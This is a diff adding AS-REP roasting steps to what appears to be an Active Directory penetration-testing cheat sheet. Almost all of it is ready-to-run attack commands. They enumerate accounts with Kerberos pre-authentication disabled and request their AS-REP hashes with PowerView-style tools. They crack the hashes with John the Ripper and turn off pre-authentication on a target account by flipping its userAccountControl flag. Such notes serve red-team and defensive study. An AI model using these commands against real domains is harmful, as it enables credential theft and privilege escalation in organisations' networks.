@@ -508,3 +508,30 @@ Crack the Service account password:
 # Targeted Kerberoasting - AS-REPs
 https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
 
+```Get-DomainUser -PreauthNotRequired -Verbose```
+
+OR using ActiveDirectory module:
+
+```Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} - Properties DoesNotRequirePreAuth```
+
+#### Get AS-REPs
+
+```Get-ASREPHash -UserName VPN1user -Verbose```
+
+OR to enumerate all users with Kerberos preauth disabled and request a hash automagically:
+
+```Invoke-ASREPRoast -Verbose```
+
+#### Cracking hashes
+
+```./john vpn1user.txt --wordlist=wordlist.txt```
+
+#### Disabling Pre-Auth
+
+```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```
+
+```Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose```
+
+```Get-DomainUser -PreauthNotRequired -Verbose```
+
+# Privilege Escalation - Target a User via Kerberoasting Set-SPN
